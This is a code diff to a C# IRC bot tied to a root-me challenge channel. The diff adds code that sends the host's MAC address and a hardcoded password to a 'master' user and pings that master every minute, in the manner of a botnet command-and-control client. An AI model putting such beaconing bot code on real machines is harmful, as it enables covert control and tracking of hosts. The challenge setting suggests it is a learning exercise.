@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
+using System.Net.NetworkInformation;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
@@ -18,6 +19,7 @@ namespace Bot                       //https://www.root-me.org/spip.php?page=webi
         static string namebot = GetName(3);
         static string realnamebot = GetName(2) + namebot;
         static string channel = "#root-me_challenge";
+        static object mac = InfoPC.GetMACAddress();
 
         static string MasterName = "Agrinutel";
 
@@ -32,16 +34,31 @@ namespace Bot                       //https://www.root-me.org/spip.php?page=webi
             Irc.OnErrorMessage += Irc_OnErrorMessage;
             if (Irc.GetChannelUser(channel, namebot) == null) Connect();
             //Отправляет сообщение КЦ
-            TransferOfInformation();
+            Autentification();
+            IsOnline();
             while (true)
             {
                 string msg = Console.ReadLine();
                 Irc.SendMessage(SendType.Message, channel, msg);
-                //Console.WriteLine(msg);
             }
             
         }
-
+        private static void Autentification()
+        {
+            Irc.RfcPrivmsg(MasterName, string.Format("myPassword autentification {0} {1} {2}", namebot, realnamebot, mac));
+        }
+        private static async void IsOnline()
+        {
+            await Task.Run(() =>
+            {
+                while (true)
+                {
+                    SendMessageMaster("isOnline");
+                    Thread.Sleep(60 * 1000);
+                }
+            });
+        }
+        private static void SendMessageMaster(string msg) => Irc.RfcPrivmsg(MasterName, "myPassword " + msg);
         private static void Irc_OnQueryMessage(object sender, IrcEventArgs e)
         {
             
@@ -81,11 +98,6 @@ namespace Bot                       //https://www.root-me.org/spip.php?page=webi
                 Console.WriteLine(ex.Message);
             }
         }
-        private static void TransferOfInformation()
-        {
-            Irc.RfcPrivmsg(MasterName, "myPassword newBot " + namebot +" "+ realnamebot);
-        }
-
         static async void Connect()
         {
             Irc.Connect(ip, port);
